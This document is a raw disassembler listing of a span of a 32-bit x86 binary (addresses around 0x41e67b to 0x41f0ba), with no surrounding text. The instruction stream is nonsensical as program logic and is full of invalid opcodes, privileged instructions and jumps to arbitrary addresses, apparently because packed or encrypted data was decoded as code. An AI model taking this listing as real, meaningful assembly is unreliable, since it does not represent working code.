  41e67b:	add    dh,ch
  41e67d:	sbb    eax,0x555d028f
  41e682:	sbb    eax,0x74c98a70
  41e687:	clc    
  41e688:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e689:	cmp    ecx,DWORD PTR [esi]
  41e68b:	imul   ebx,esi,0xfffffff4
  41e68e:	fisttp QWORD PTR [eax]
	...
  41e6f4:	lds    ebx,FWORD PTR [eax+0x7dfd55e1]
  41e6fa:	cmc    
  41e6fb:	cwde   
  41e6fc:	xchg   esp,eax
  41e6fd:	push   0x37
  41e6ff:	sub    ebx,DWORD PTR [edx]
  41e701:	mov    bh,0xf5
  41e703:	cmp    DWORD PTR [ebx+eax*2+0x1040001],ebx
  41e70a:	add    BYTE PTR [eax],al
  41e70c:	mov    dh,0xa0
  41e70e:	adc    eax,0x2c00467f
  41e713:	pop    ebx
  41e714:	loop   0x41e76b
  41e716:	lea    edi,[ecx-0x28]
  41e719:	add    eax,0x38215ba4
  41e71e:	lds    ecx,FWORD PTR [eax+0x44]
  41e721:	fwait
  41e722:	adc    eax,0x5a536a65
  41e727:	pop    ebx
  41e728:	mov    al,0x4f
  41e72a:	adc    al,0xb9
  41e72c:	mov    DWORD PTR [esi],0xf1f27e86
  41e732:	sub    edi,DWORD PTR [esi]
  41e734:	pushf  
  41e735:	jo     0x41e721
  41e737:	stos   BYTE PTR es:[edi],al
  41e738:	adc    eax,0xfb67700f
  41e73d:	or     DWORD PTR [eax+ecx*1-0x51],esi
  41e741:	pop    ebp
  41e742:	js     0x41e732
  41e744:	dec    ebp
  41e745:	adc    BYTE PTR [ebx+0xb327d45],ch
  41e74b:	xchg   edx,eax
  41e74c:	xor    edx,DWORD PTR [edi]
  41e74e:	mov    BYTE PTR fs:[edx],ch
  41e751:	ror    BYTE PTR ds:0xe6da3aca,cl
  41e757:	and    BYTE PTR [esi-0x48],ch
  41e75a:	cmp    DWORD PTR [edi],ecx
  41e75c:	call   esi
  41e75e:	cs jmp 0x30026885
  41e764:	sub    eax,0x6332c61b
  41e769:	push   ebx
  41e76a:	mov    ds:0x8f4952c1,al
  41e76f:	test   BYTE PTR [ecx-0x54],ch
  41e772:	lods   al,BYTE PTR ds:[esi]
  41e773:	aaa    
  41e774:	adc    bl,BYTE PTR [ebx]
  41e776:	mov    esp,DWORD PTR ds:0xfea3b1c
  41e77c:	retf   
  41e77d:	fsub   QWORD PTR cs:[ebx+0x1c]
  41e781:	jmp    0x41e7ad
  41e783:	mov    ss,WORD PTR ds:0x1e638c52
  41e789:	jmp    0x29624744
  41e78e:	pop    ebp
  41e78f:	push   ebp
  41e790:	test   al,0xb3
  41e792:	aas    
  41e793:	dec    esp
  41e794:	adc    esp,DWORD PTR [edx+ebp*8+0x336a7347]
  41e79b:	xor    BYTE PTR ds:0x13d5f6d5,0xc9
  41e7a2:	fidivr DWORD PTR [ebp+0x18]
  41e7a5:	repnz mov eax,ds:0x5fd061e9
  41e7ab:	inc    ebx
  41e7ac:	aam    0x34
  41e7ae:	mov    DWORD PTR [esi],ebp
  41e7b0:	push   es
  41e7b1:	addr16 call 0xb452d5e1
  41e7b7:	pop    edx
  41e7b8:	mov    eax,DWORD PTR [ebp-0x799e3152]
  41e7be:	stc    
  41e7bf:	xor    DWORD PTR [ecx+ebx*4-0x60],ebx
  41e7c3:	and    esi,DWORD PTR [ebx+0x76b4779c]
  41e7c9:	and    dl,BYTE PTR [bp+0x1b]
  41e7cd:	dec    esp
  41e7ce:	jmp    0xcb1e:0x5bbf4819
  41e7d5:	jmp    0xe98bab6f
  41e7da:	jb     0x41e7a4
  41e7dc:	push   0xffffffe7
  41e7de:	rol    ebx,1
  41e7e0:	imul   edi,eax,0xffffffa1
  41e7e3:	inc    edi
  41e7e4:	cmp    eax,0x3640c1f1
  41e7e9:	loopne 0x41e82c
  41e7eb:	fwait
  41e7ec:	or     BYTE PTR [edx-0x501a26e8],0x11
  41e7f3:	ds aad 0xd6
  41e7f6:	xor    DWORD PTR [ecx],ebp
  41e7f8:	mov    dl,BYTE PTR [ebp+0x138f0574]
  41e7fe:	mov    esi,0xe65ace76
  41e803:	add    DWORD PTR [ecx-0x5bb14a56],edx
  41e809:	or     BYTE PTR [edi+0x37],bl
  41e80c:	outs   dx,BYTE PTR ds:[esi]
  41e80d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e80e:	adc    al,0x58
	...
  41e874:	sub    eax,0x9e5c8a39
  41e879:	(bad)  
  41e87a:	(bad)  
  41e87b:	jns    0x41e8ec
  41e87d:	xor    al,0xcc
  41e87f:	jg     0x41e8a5
  41e881:	inc    edi
  41e882:	(bad)  
  41e883:	push   fs
  41e885:	inc    esp
  41e886:	add    DWORD PTR [eax],eax
  41e888:	add    al,0x1
  41e88a:	add    BYTE PTR [eax],al
  41e88c:	xlat   BYTE PTR ds:[ebx]
  41e88d:	mov    bl,0xaa
  41e88f:	pushf  
  41e890:	cld    
  41e891:	and    cl,BYTE PTR [esp+eax*2]
  41e894:	push   ecx
  41e895:	arpl   WORD PTR [edi],bp
  41e897:	adc    esi,ecx
  41e899:	enter  0x4ba1,0x9d
  41e89d:	pop    ds
  41e89e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e89f:	cmp    BYTE PTR es:[esp+ecx*4+0x404dfe64],cl
  41e8a7:	pop    es
  41e8a8:	mov    esp,eax
  41e8aa:	loopne 0x41e8c3
  41e8ac:	cli    
  41e8ad:	pushf  
  41e8ae:	sub    bl,BYTE PTR [esi]
  41e8b0:	outs   dx,BYTE PTR ds:[esi]
  41e8b1:	add    BYTE PTR [edi+ebp*4],bl
  41e8b4:	lods   al,BYTE PTR ds:[esi]
  41e8b5:	retf   
  41e8b6:	xchg   ecx,eax
  41e8b7:	sub    ebp,DWORD PTR [ebp+0x1527aeb2]
  41e8bd:	pop    ds
  41e8be:	shl    BYTE PTR [esi],0xcf
  41e8c1:	gs cmp al,0x60
  41e8c4:	cli    
  41e8c5:	pushf  
  41e8c6:	and    al,0x39
  41e8c8:	and    al,0xd1
  41e8ca:	adc    DWORD PTR [ebp-0x20],ecx
  41e8cd:	adc    ah,0xc6
  41e8d0:	loope  0x41e88c
  41e8d2:	nop
  41e8d3:	or     BYTE PTR ds:0x8998fa21,ah
  41e8d9:	fld    TBYTE PTR [edx+0x6]
  41e8dc:	mov    ebp,0xf4d734c3
  41e8e1:	dec    esp
  41e8e2:	sub    eax,0xdc0929bb
  41e8e7:	xchg   esp,eax
  41e8e8:	cmc    
  41e8e9:	test   al,0x25
  41e8eb:	inc    edx
  41e8ec:	sbb    eax,0x550d7acf
  41e8f1:	out    0x3b,eax
  41e8f3:	cmp    BYTE PTR [edi+0x5ffca86d],0x2a
  41e8fa:	inc    ecx
  41e8fb:	sbb    BYTE PTR [eax-0x47],ah
  41e8fe:	popa   
  41e8ff:	pusha  
  41e900:	pop    esp
  41e901:	mov    esp,0x582d690
  41e906:	sbb    BYTE PTR [ebp+0x27],bh
  41e909:	jno    0x41e8a4
  41e90b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e90c:	pop    ss
  41e90d:	xchg   edx,eax
  41e90e:	int    0x28
  41e910:	aam    0xa2
  41e912:	push   0xfffffff5
  41e914:	gs push cs
  41e916:	pop    ebx
  41e917:	(bad)  
  41e919:	shl    DWORD PTR [esi+0x38c7e7ae],cl
  41e91f:	push   cs
  41e920:	popa   
  41e921:	mov    eax,ds:0xcc0a3ad0
  41e926:	shl    DWORD PTR [eax],0x30
  41e929:	xchg   edi,eax
  41e92a:	cmp    dl,BYTE PTR ds:0xa9437b7a
  41e930:	jg     0x41e8c7
  41e932:	test   eax,0x8ba252b0
  41e937:	dec    eax
  41e938:	xor    DWORD PTR [eax+0x5064894a],ebx
  41e93e:	dec    edx
  41e93f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e940:	aad    0xa7
  41e942:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e943:	push   ebx
  41e944:	and    ecx,DWORD PTR [ecx+0x33a9e55]
  41e94a:	inc    ebp
  41e94b:	mov    ah,BYTE PTR [ecx-0x24]
  41e94e:	mov    cl,0xfd
  41e950:	aas    
  41e951:	(bad)
  41e954:	(bad)  
  41e955:	jmp    DWORD PTR [eax]
  41e957:	xor    dl,BYTE PTR [ebx]
  41e959:	int3   
  41e95a:	mov    eax,0xef48150c
  41e95f:	xor    DWORD PTR [edx+edi*2-0x23],ebx
  41e963:	push   esi
  41e964:	jle    0x41e979
  41e966:	test   eax,0xf5fd4988
  41e96b:	or     al,0x66
  41e96d:	push   esp
  41e96e:	nop
  41e96f:	pop    ecx
  41e970:	inc    ebp
  41e971:	in     al,dx
  41e972:	sub    al,BYTE PTR [ebp+0x2f]
  41e975:	adc    cl,BYTE PTR [edi]
  41e977:	sub    eax,0xa2f61070
  41e97c:	pop    esp
  41e97d:	xor    BYTE PTR [eax+0x1c],dl
  41e980:	test   eax,0x571ade5a
  41e985:	fdivp  st(5),st
  41e987:	mov    ds:0x26da2536,al
  41e98c:	add    eax,0x28638b
	...
  41e9f1:	add    BYTE PTR [eax],al
  41e9f3:	add    BYTE PTR [eax-0x3],bh
  41e9f6:	ret    0xc766
  41e9f9:	jg     0x41e9f7
  41e9fb:	dec    DWORD PTR [edi+0x67]
  41e9fe:	rol    dl,1
  41ea00:	xchg   esp,eax
  41ea01:	cwde   
  41ea02:	mul    BYTE PTR [edx-0x5c]
  41ea05:	inc    ebp
  41ea06:	add    DWORD PTR [eax],eax
  41ea08:	add    al,0x1
  41ea0a:	add    BYTE PTR [eax],al
  41ea0c:	add    DWORD PTR [ebx+0x7],0xffffffda
  41ea10:	stos   BYTE PTR es:[edi],al
  41ea11:	icebp  
  41ea12:	sub    BYTE PTR [ecx],0xcf
  41ea15:	mov    al,0x13
  41ea17:	imul   bl
  41ea19:	out    0x50,al
  41ea1b:	ins    BYTE PTR es:[edi],dx
  41ea1c:	mov    esi,DWORD PTR [ebx*1-0x3d517d6f]
  41ea23:	add    esi,ebx
  41ea25:	repnz xor DWORD PTR [edi+esi*4],eax
  41ea29:	or     DWORD PTR [ebx],ecx
  41ea2b:	mov    DWORD PTR [eax-0x70e4458a],ebx
  41ea31:	dec    esp
  41ea32:	int    0x74
  41ea34:	pusha  
  41ea35:	loop   0x41ea99
  41ea37:	cld    
  41ea38:	cmp    eax,0xec9a22d8
  41ea3d:	sub    edx,ebx
  41ea3f:	inc    edi
  41ea40:	cmp    ch,BYTE PTR [edx+0x7ed46e66]
  41ea46:	aas    
  41ea47:	mov    edx,0xc2caeb1f
  41ea4c:	cmp    ecx,DWORD PTR [edx+0x5c95b06d]
  41ea52:	fistp  WORD PTR [ebp+0x31]
  41ea55:	cmp    edi,DWORD PTR [edi]
  41ea57:	and    DWORD PTR [edx+esi*4-0x764582b5],0x5f
  41ea5f:	cmp    ecx,edx
  41ea61:	jb     0x41ea9b
  41ea63:	dec    eax
  41ea64:	ja     0x41e9fd
  41ea66:	out    dx,al
  41ea67:	xor    esp,DWORD PTR [ebp+0x1d]
  41ea6a:	add    al,BYTE PTR [edx]
  41ea6c:	push   esp
  41ea6d:	mov    dh,0x66
  41ea6f:	dec    esp
  41ea70:	ja     0x41ea65
  41ea72:	and    BYTE PTR [edi+0x63],ah
  41ea75:	cld    
  41ea76:	sbb    eax,0x2638bcc6
  41ea7b:	jmp    0x8ff6613b
  41ea80:	scas   al,BYTE PTR es:[edi]
  41ea81:	and    BYTE PTR [ecx-0x46110031],bl
  41ea87:	bound  edi,QWORD PTR [ebp-0x3f]
  41ea8a:	ds fwait
  41ea8c:	fwait
  41ea8d:	and    esi,edi
  41ea8f:	push   cs
  41ea90:	jle    0x41ea77
  41ea92:	or     edx,ebx
  41ea94:	mov    edi,0xe6f6cb9a
  41ea99:	mov    al,ds:0x355ff76f
  41ea9e:	adc    al,0x45
  41eaa0:	ds call 0x8174:0x7169b87c
  41eaa8:	inc    sp
  41eaaa:	call   0xf02dbe6d
  41eaaf:	push   ds
  41eab0:	mov    eax,ds:0xe527c146
  41eab5:	xor    DWORD PTR [ebx+0x66],esi
  41eab8:	stos   BYTE PTR es:[edi],al
  41eab9:	or     BYTE PTR [edx-0x1c],ah
  41eabc:	repz sbb BYTE PTR [ebp-0x40772e9b],al
  41eac3:	sar    DWORD PTR ds:0xc08cb9a2,1
  41eac9:	jmp    0x41ea88
  41eacb:	sub    ecx,DWORD PTR [ebp-0x34e46f2e]
  41ead1:	xchg   edx,eax
  41ead2:	jg     0x41eaa9
  41ead4:	and    eax,0xa4a539d2
  41ead9:	xchg   esi,eax
  41eada:	in     eax,0x67
  41eadc:	mov    al,ds:0x297f717
  41eae1:	(bad)  
  41eae2:	push   ebp
  41eae3:	ins    BYTE PTR es:[edi],dx
  41eae4:	add    eax,0x4fc64c51
  41eae9:	outs   dx,BYTE PTR ds:[esi]
  41eaea:	jp     0x41eb4a
  41eaec:	jp     0x41eb69
  41eaee:	sub    DWORD PTR [edx+0x21],ebx
  41eaf1:	and    eax,0x76f76040
  41eaf6:	jge    0x41eb09
  41eaf8:	icebp  
  41eaf9:	adc    eax,0x40038986
  41eafe:	adc    eax,0xb57643d2
  41eb03:	jno    0x41eb78
  41eb05:	rcr    BYTE PTR [ebp+0x49],cl
  41eb08:	aad    0x8
  41eb0a:	mov    al,ds:0xe84fce02
	...
  41eb73:	add    BYTE PTR [edx],dl
  41eb75:	das    
  41eb76:	mov    esi,DWORD PTR [edi+edi*4+0xaaf3fb4]
  41eb7d:	out    0x9b,al
  41eb7f:	aad    0x44
  41eb81:	mov    BYTE PTR [edi],cl
  41eb83:	push   esp
  41eb84:	test   al,0x46
  41eb86:	add    DWORD PTR [eax],eax
  41eb88:	add    al,0x1
  41eb8a:	add    BYTE PTR [eax],al
  41eb8c:	scas   al,BYTE PTR es:[edi]
  41eb8d:	push   0x43c3f97c
  41eb92:	mov    dh,0xa9
  41eb94:	ficomp DWORD PTR [eiz*8-0xe226889]
  41eb9b:	out    0xa6,eax
  41eb9d:	mov    ds:0x89fab6ff,al
  41eba2:	test   ebx,edx
  41eba4:	mov    ebx,0x9e8ef415
  41eba9:	adc    BYTE PTR [edx],ah
  41ebab:	gs xchg esp,eax
  41ebad:	dec    ebp
  41ebae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ebaf:	inc    esi
  41ebb0:	jnp    0x41ebfd
  41ebb2:	pop    edi
  41ebb3:	sahf   
  41ebb4:	xchg   esp,eax
  41ebb5:	(bad)  
  41ebb8:	std    
  41ebb9:	or     al,0x28
  41ebbb:	mov    dl,0xcd
  41ebbd:	int    0xf9
  41ebbf:	and    dh,bl
  41ebc1:	xchg   ecx,eax
  41ebc2:	rcr    BYTE PTR [ecx],cl
  41ebc4:	mov    eax,0x2d17488a
  41ebc9:	bound  ecx,QWORD PTR [ebx+0x3d]
  41ebcc:	addr16 ss push ecx
  41ebcf:	inc    esp
  41ebd0:	cmp    dl,BYTE PTR [edx-0x5f]
  41ebd3:	mov    esp,0x8bf5d3f0
  41ebd8:	lahf   
  41ebd9:	and    BYTE PTR [eax-0x4],dh
  41ebdc:	sub    eax,0xeac08e31
  41ebe1:	adc    edx,DWORD PTR [ebx-0x4f554d72]
  41ebe7:	in     eax,0x9a
  41ebe9:	dec    esi
  41ebea:	dec    eax
  41ebeb:	and    DWORD PTR [esi],ebp
  41ebed:	(bad)  
  41ebee:	xor    dh,bh
  41ebf0:	fisubr DWORD PTR [edx-0x1a]
  41ebf3:	sbb    cl,dh
  41ebf5:	dec    eax
  41ebf6:	fldcw  WORD PTR [ebp+0x48]
  41ebf9:	jl     0x41ec6c
  41ebfb:	mov    edi,0xfd02250c
  41ec00:	icebp  
  41ec01:	das    
  41ec02:	fdivr  QWORD PTR [esi+0x2ab37aa9]
  41ec08:	pushf  
  41ec09:	pushf  
  41ec0a:	mov    DWORD PTR [eax],eax
  41ec0c:	stos   BYTE PTR es:[edi],al
  41ec0d:	std    
  41ec0e:	rcr    ebx,cl
  41ec10:	add    ebx,DWORD PTR [ecx]
  41ec12:	retf   0x80ba
  41ec15:	call   0xb2c4:0xa2596690
  41ec1c:	push   esi
  41ec1d:	xchg   ecx,eax
  41ec1e:	fstp   DWORD PTR [ecx+0x12]
  41ec21:	and    eax,0x67d1e808
  41ec26:	ins    DWORD PTR es:[edi],dx
  41ec27:	and    cl,cl
  41ec29:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ec2a:	push   0xf5828f2a
  41ec2f:	inc    ebp
  41ec30:	sub    DWORD PTR [edx-0x21],esi
  41ec33:	mov    dl,0xf0
  41ec35:	mov    ah,0xa3
  41ec37:	pop    edi
  41ec38:	test   DWORD PTR [eax+edx*2+0x14],esp
  41ec3c:	into   
  41ec3d:	pop    edi
  41ec3e:	addr16 ret 
  41ec40:	cmc    
  41ec41:	mov    edi,0xb2971ea0
  41ec46:	pop    es
  41ec47:	mov    ah,0x6c
  41ec49:	cld    
  41ec4a:	jmp    0x41ec10
  41ec4c:	retf   0x691d
  41ec4f:	sti    
  41ec50:	push   es
  41ec51:	pop    ebp
  41ec52:	adc    esi,DWORD PTR [esi+esi*8-0x2a]
  41ec56:	ret    
  41ec57:	jnp    0x41ec8d
  41ec59:	mov    ch,BYTE PTR [eax]
  41ec5b:	mov    ecx,0x4659fd1
  41ec60:	adc    dl,BYTE PTR [eax-0x63a6a312]
  41ec66:	cmp    al,0x38
  41ec68:	push   ebx
  41ec69:	fstp   DWORD PTR [ecx+edi*1-0x322c7a91]
  41ec70:	push   ebp
  41ec71:	sub    BYTE PTR [ecx],ah
  41ec73:	or     edx,edx
  41ec75:	sbb    ch,BYTE PTR [eax]
  41ec77:	rcr    DWORD PTR [ebx+ecx*8+0xd19b515],cl
  41ec7e:	adc    BYTE PTR [edi+0x6a],0x1c
  41ec82:	pop    edx
  41ec84:	inc    eax
  41ec85:	pop    ecx
  41ec86:	cwde   
  41ec87:	cmp    ch,bh
  41ec89:	add    esi,ebp
  41ec8b:	mov    al,0x6
  41ec8d:	cld    
  41ec8e:	loopne 0x41ecde
	...
  41ecf4:	inc    ecx
  41ecf5:	icebp  
  41ecf6:	(bad)
  41ecf9:	hlt    
  41ecfa:	gs icebp 
  41ecfc:	dec    edi
  41ecfd:	adc    eax,0x46d95fd0
  41ed02:	test   al,0x1c
  41ed04:	lods   al,BYTE PTR ds:[esi]
  41ed05:	inc    edi
  41ed06:	add    DWORD PTR [eax],eax
  41ed08:	add    al,0x1
  41ed0a:	add    BYTE PTR [eax],al
  41ed0c:	out    dx,eax
  41ed0d:	push   esp
  41ed0e:	(bad)  
  41ed0f:	cmp    DWORD PTR [esi+0x17],ecx
  41ed12:	cmpps  xmm7,XMMWORD PTR [edx-0x1ba9bc4a],0xb4
  41ed1a:	xor    edx,ecx
  41ed1c:	addr16 jae 0x41ed8e
  41ed1f:	or     BYTE PTR [edi+0xe],0x3a
  41ed23:	mov    al,0x40
  41ed25:	cmp    edx,edx
  41ed27:	xchg   DWORD PTR [eax+0x54],ecx
  41ed2a:	mov    ebx,0x7727e092
  41ed2f:	add    DWORD PTR [edi+ecx*4+0x77aad1c4],eax
  41ed36:	dec    edx
  41ed37:	out    0x71,al
  41ed39:	push   ebx
  41ed3a:	test   DWORD PTR [ebp+0xf],ecx
  41ed3d:	out    dx,eax
  41ed3e:	pop    edx
  41ed3f:	push   ecx
  41ed40:	ins    BYTE PTR es:[edi],dx
  41ed41:	mov    esi,0x7e39a0e5
  41ed46:	sub    esp,edi
  41ed48:	adc    al,0x45
  41ed4a:	fdivr  st,st(7)
  41ed4c:	std    
  41ed4d:	or     eax,0xfb20ead6
  41ed52:	and    bh,dh
  41ed54:	enter  0xbafb,0x1d
  41ed58:	or     eax,DWORD PTR [edx+0x3d]
  41ed5b:	add    edx,DWORD PTR [esi]
  41ed5d:	sub    DWORD PTR [esi+0x15aa623d],ebp
  41ed63:	stos   BYTE PTR es:[edi],al
  41ed64:	pop    esp
  41ed65:	jno    0x41edaf
  41ed67:	xchg   edi,eax
  41ed68:	pushf  
  41ed69:	popa   
  41ed6a:	mov    eax,DWORD PTR [esi+0x29]
  41ed6d:	xchg   esp,eax
  41ed6e:	call   0xe22f:0xd15f52da
  41ed75:	mov    dh,0x11
  41ed77:	sub    al,0x7
  41ed79:	sbb    BYTE PTR [edi-0x6292f524],0x55
  41ed80:	(bad)
  41ed85:	test   al,0x63
  41ed87:	inc    edi
  41ed88:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ed89:	xor    DWORD PTR [ebx+0x35],esi
  41ed8c:	push   ebx
  41ed8d:	or     ch,BYTE PTR [edx+0x5e]
  41ed90:	imul   esp,esp,0xe2e3342a
  41ed96:	jl     0x41edd2
  41ed98:	xor    ebx,DWORD PTR [esi-0x3b1d5791]
  41ed9e:	add    eax,0xf2d77232
  41eda3:	in     eax,dx
  41eda4:	mov    esp,0x2093f64
  41eda9:	ja     0x41ee22
  41edab:	jle    0x41ee02
  41edad:	js     0x41edc5
  41edaf:	bound  esi,QWORD PTR [ecx+edi*4+0x28]
  41edb3:	outs   dx,DWORD PTR ds:[esi]
  41edb4:	fs test edi,edi
  41edb7:	cmp    eax,0x4fe37529
  41edbc:	out    dx,al
  41edbd:	pop    edi
  41edbe:	(bad)  
  41edbf:	dec    esi
  41edc0:	int    0xf7
  41edc2:	xor    BYTE PTR [edi],ch
  41edc4:	mov    eax,0xab42fa3c
  41edc9:	mov    ch,0x20
  41edcb:	cli    
  41edcc:	pushf  
  41edcd:	or     al,0xd1
  41edcf:	mov    dh,0xab
  41edd1:	jle    0x41ee0c
  41edd3:	lahf   
  41edd4:	imul   ebx,DWORD PTR [ebx],0xd40b7b23
  41edda:	pusha  
  41eddb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41eddc:	cmp    BYTE PTR ds:0x35a33056,dl
  41ede2:	cmp    al,0x61
  41ede4:	imul   ecx,DWORD PTR [edi-0x5f],0xce495b3e
  41edeb:	ret    
  41edec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41eded:	xchg   edx,eax
  41edee:	popf   
  41edef:	sbb    BYTE PTR es:[eax],dh
  41edf2:	sbb    bl,al
  41edf4:	lock (bad) 
  41edf6:	and    ecx,ebx
  41edf8:	xchg   DWORD PTR ds:0x4d04f5e7,ebx
  41edfe:	(bad)  
  41edff:	call   0x28100de4
  41ee04:	std    
  41ee05:	data16 fimul WORD PTR [ebp+0x26693dc2]
  41ee0c:	mov    esi,0xce6b45
	...
  41ee71:	add    BYTE PTR [eax],al
  41ee73:	add    BYTE PTR ds:0x7b197956,al
  41ee79:	aas    
  41ee7a:	gs pop esi
  41ee7c:	pop    edx
  41ee7d:	repnz call 0xb039:0xd171cee7
  41ee85:	dec    eax
  41ee86:	add    DWORD PTR [eax],eax
  41ee88:	add    al,0x1
  41ee8a:	add    BYTE PTR [eax],al
  41ee8c:	imul   ebp,DWORD PTR [ecx-0x6862ad2],0xffffff96
  41ee93:	fisttp DWORD PTR [ebx+0x6d]
  41ee96:	push   ecx
  41ee97:	and    al,0x36
  41ee99:	mov    ch,al
  41ee9b:	fdiv   DWORD PTR [ebx]
  41ee9d:	lahf   
  41ee9e:	jmp    0x5c9cd52
  41eea3:	test   eax,0xa56b7ba9
  41eea8:	inc    edx
  41eea9:	data16 shl bh,0x3c
  41eead:	xchg   dh,bl
  41eeaf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41eeb0:	push   cs
  41eeb1:	mov    ds:0xc2414169,eax
  41eeb6:	xor    eax,0xe5fc29f9
  41eebb:	cmp    eax,0x7944b482
  41eec0:	push   esi
  41eec1:	call   0x1dc4ce32
  41eec6:	jmp    0x5eeb3e79
  41eecb:	cmp    DWORD PTR [edx-0x43],eax
  41eece:	repnz mov al,0x41
  41eed1:	imul   ebp,DWORD PTR [eax+0x2e],0x4c
  41eed5:	adc    eax,0xbd762ec4
  41eeda:	ret    
  41eedb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41eedc:	push   esp
  41eedd:	pop    ss
  41eede:	and    eax,0x7286d5e9
  41eee3:	mov    al,ds:0x9d6da565
  41eee8:	mov    eax,ds:0xac1a8e4d
  41eeed:	fsub   DWORD PTR [esi]
  41eeef:	mov    ds:0xf2e8cc78,eax
  41eef4:	cmp    BYTE PTR [eax],0x74
  41eef7:	shr    BYTE PTR [esi+0x57],0xb5
  41eefb:	test   al,0xe6
  41eefd:	push   ds
  41eefe:	cs inc ecx
  41ef00:	cmp    eax,0xbbdad238
  41ef05:	xor    edi,DWORD PTR [edi+0x43]
  41ef08:	pop    ebx
  41ef09:	enter  0x4c34,0x6d
  41ef0d:	fnstenv [ecx+0x76000862]
  41ef13:	or     ecx,ecx
  41ef15:	mov    edi,0x6f2b1101
  41ef1a:	dec    edi
  41ef1b:	push   eax
  41ef1c:	adc    dl,cl
  41ef1e:	lods   al,BYTE PTR ds:[esi]
  41ef1f:	jecxz  0x41ef6c
  41ef21:	int3   
  41ef22:	mov    bh,0x82
  41ef24:	add    DWORD PTR [ebp+0x20abfdf],edi
  41ef2a:	inc    eax
  41ef2b:	xor    bl,BYTE PTR [edx+0x3505efc]
  41ef31:	mov    dh,BYTE PTR [ebx+0x7b]
  41ef34:	jmp    0x8af6:0xdff43e0b
  41ef3b:	arpl   WORD PTR [esi-0x3923915d],bp
  41ef41:	mov    ebx,0xd19e93e7
  41ef46:	jae    0x41ef5f
  41ef48:	clc    
  41ef49:	fisub  DWORD PTR [ebx]
  41ef4b:	push   es
  41ef4c:	(bad)  
  41ef4d:	push   ss
  41ef4e:	push   cs
  41ef4f:	and    BYTE PTR [esi+esi*2+0x3b3a5899],ah
  41ef56:	int3   
  41ef57:	xchg   BYTE PTR [eax-0x4a4e1c5c],dh
  41ef5d:	fnstcw WORD PTR [eax]
  41ef5f:	sub    al,0x23
  41ef61:	out    0xc8,al
  41ef63:	xchg   edi,eax
  41ef64:	sub    DWORD PTR [esi],esi
  41ef66:	dec    ebx
  41ef67:	(bad)  
  41ef68:	scas   eax,DWORD PTR es:[edi]
  41ef69:	jmp    0x41efdd
  41ef6b:	and    eax,0x15ffb5b4
  41ef70:	aaa    
  41ef71:	push   es
  41ef72:	out    dx,eax
  41ef73:	push   edi
  41ef74:	mov    ebx,es
  41ef76:	imul   esi,DWORD PTR ds:0xc5ae8a36,0xe9715de0
  41ef80:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ef81:	ret    0x87be
  41ef84:	hlt    
  41ef85:	pushf  
  41ef86:	push   esi
  41ef87:	jle    0x41ef15
  41ef89:	in     eax,dx
  41ef8a:	and    dh,cl
  41ef8c:	mov    ds:0xd74596,eax
	...
  41eff1:	add    BYTE PTR [eax],al
  41eff3:	add    BYTE PTR [ecx-0xda40a3],bh
  41eff9:	out    0xbb,eax
  41effb:	fisttp QWORD PTR [ecx+0x0]
  41effe:	lock imul ebx,DWORD PTR [ecx-0x4ba26881],0x49
  41f006:	add    DWORD PTR [eax],eax
  41f008:	add    al,0x1
  41f00a:	add    BYTE PTR [eax],al
  41f00c:	rcr    BYTE PTR [ebx+0x227a7e9a],0x62
  41f013:	adc    DWORD PTR [esi+0x6f1e46d9],ecx
  41f019:	inc    esi
  41f01a:	push   esp
  41f01b:	sub    eax,0xda3a537c
  41f020:	out    0xa7,eax
  41f022:	sbb    DWORD PTR [ecx+0x2b684b61],edx
  41f028:	lods   eax,DWORD PTR ds:[esi]
  41f029:	mov    DWORD PTR [edx-0x57],0xa5953a04
  41f030:	mov    ebx,0xff11cdb
  41f035:	mov    dl,0xe4
  41f037:	xchg   DWORD PTR [edx],ecx
  41f039:	stc    
  41f03a:	xchg   DWORD PTR [edi+ecx*1+0x7a],edx
  41f03e:	inc    ebx
  41f03f:	outs   dx,DWORD PTR ds:[esi]
  41f040:	aaa    
  41f041:	xor    DWORD PTR [edi+esi*1],eax
  41f044:	jge    0x41f01d
  41f046:	jge    0x41efed
  41f048:	or     edx,DWORD PTR [edi+0x4538fdea]
  41f04e:	push   eax
  41f04f:	mov    edi,ebp
  41f051:	mov    bl,0xa8
  41f053:	daa    
  41f054:	push   edx
  41f055:	(bad)  
  41f056:	repz mov ch,BYTE PTR [esi]
  41f059:	mov    esp,0x6923b8c8
  41f05e:	call   0x58decb5a
  41f063:	fcomp  st(6)
  41f065:	or     BYTE PTR [edi-0x38aaf762],0x81
  41f06c:	jmp    0x4adf631a
  41f071:	in     al,dx
  41f072:	stos   DWORD PTR es:[edi],eax
  41f073:	sbb    BYTE PTR [eax-0x6bd4fe64],al
  41f079:	inc    eax
  41f07a:	sbb    eax,0xe00f7e9d
  41f07f:	rcr    DWORD PTR [edx+0x4e],1
  41f082:	xchg   esi,eax
  41f083:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f084:	fwait
  41f085:	dec    esi
  41f086:	xor    eax,0xd5e27863
  41f08b:	and    DWORD PTR ds:0xc9f890cb,ebx
  41f091:	pop    esi
  41f092:	mov    ds:0xfc49fe9f,al
  41f097:	sub    dl,BYTE PTR [eax]
  41f099:	leave  
  41f09a:	in     al,0xd9
  41f09c:	xlat   BYTE PTR ds:[ebx]
  41f09d:	cli    
  41f09e:	mov    al,ds:0xf6887661
  41f0a3:	into   
  41f0a4:	sub    ah,dh
  41f0a6:	sahf   
  41f0a7:	mov    ebp,0x2d91ad59
  41f0ac:	jle    0x41f0ab
  41f0ae:	aam    0x35
  41f0b0:	dec    esi
  41f0b1:	xchg   edi,eax
  41f0b2:	lock mov DWORD PTR [esi+edx*8-0x44ea7a8],ebp
  41f0ba:	ds mov cl,0x92
